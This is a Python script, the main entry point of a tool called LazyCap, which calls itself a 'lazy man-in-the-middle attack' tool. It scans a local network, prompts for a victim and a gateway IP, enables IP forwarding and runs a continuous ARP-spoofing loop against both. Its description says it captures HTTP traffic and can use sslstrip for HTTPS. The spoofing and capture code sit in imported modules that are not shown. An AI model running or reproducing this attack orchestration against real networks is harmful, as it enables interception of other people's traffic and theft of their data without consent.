import argparse
import time
import threading

import colorama
import sys

from colorama import init, Fore

import arp_scan
import arp_spoof
import capture

# Initialize colorama for pretty outputs with color!!
init()
init(
    autoreset=True)  # Every print statement will have it's own color. In other words it resets color after every print.

# Define colors for colorama
GREEN = Fore.GREEN
RED = Fore.RED
BLUE = Fore.BLUE
CYAN = Fore.CYAN
YELLOW = Fore.YELLOW

description = "LazyCap is a tool for a lazy man-in-the-middle attack. It start by scanning the local network for hosts." \
              "Then it starts an arp spoofing attack. Finally it captures http packets from the host. If installed, " \
              "sslstrip can be used to capture https requests as well."
parser = argparse.ArgumentParser(description=description)
args = parser.parse_args()


def spoof(target_ip, gateway_ip):
    try:
        while True:
            # Tell the victim that we are the gateway
            arp_spoof.spoof(target_ip, gateway_ip)

            # Tell the gateway that we are the target (victim)
            arp_spoof.spoof(gateway_ip, target_ip)

            # Sleep for a second to prevent a dos
            time.sleep(1)
    except KeyboardInterrupt:
        # If CTRL + C is pressed, restore
        print("[!!!] CTRL + C detected. Cleaning up. Please wait.")
        arp_spoof.restore(target_ip, gateway_ip)
        arp_spoof.restore(gateway_ip, target_ip)


def main():
    print(BLUE + "Welcome to the LazyCap. Let's get started!\n")

    # Get IP range for ARP scan
    ip_range = input(BLUE + "Target IP range to scan: ")
    scanner = arp_scan.Scanner(ip_range)
    scanner.scanner_main()

    # Get IP addresses for ARP spoofing
    target_ip = input(BLUE + "Target IP for arp spoofing (victim): ")
    gateway_ip = input(BLUE + "Gateway IP for arp spoofing: ")

    # Enable IP forwarding
    arp_spoof.enable_ip_routing()

    # Start spoofing thread
    spoofer = threading.Thread(target=spoof, args=(target_ip, gateway_ip,))
    spoofer.start()



if __name__ == '__main__':
    main()
